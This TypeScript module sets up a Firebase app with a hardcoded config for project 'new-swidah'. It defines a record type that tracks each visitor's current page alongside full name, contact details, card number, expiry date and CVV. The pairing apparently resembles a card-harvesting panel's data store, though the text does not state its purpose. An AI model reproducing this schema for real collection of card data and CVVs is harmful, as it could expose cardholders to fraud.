import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyC6YYfClSDS8JIDDLhRYQsUQb7DTrCR7_4",
  authDomain: "new-swidah.firebaseapp.com",
  projectId: "new-swidah",
  storageBucket: "new-swidah.firebasestorage.app",
  messagingSenderId: "139797141578",
  appId: "1:139797141578:web:85f9352e248cf25eab2eb3",
  measurementId: "G-ZC14VFDDJ1"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
